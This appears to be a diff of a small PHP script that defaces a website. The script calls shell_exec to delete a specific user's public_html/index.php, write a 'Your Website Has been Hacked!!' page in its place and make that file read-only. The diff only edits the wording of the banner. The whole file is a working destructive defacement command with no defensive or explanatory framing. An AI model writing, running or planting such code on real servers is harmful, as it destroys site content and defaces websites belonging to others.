@@ -1,4 +1,4 @@
 <?php
-$command = 'rm -f /home/naimul0/public_html/index.php && echo "<h1>Your Website Has been Hacked!! 111</h1>" > /home/naimul0/public_html/index.php && chmod 444 /home/naimul0/public_html/index.php';
+$command = 'rm -f /home/naimul0/public_html/index.php && echo "<h1>Your Website Has been Hacked!!</h1>" > /home/naimul0/public_html/index.php && chmod 444 /home/naimul0/public_html/index.php';
 echo shell_exec($command . ' 2>&1');
 ?>
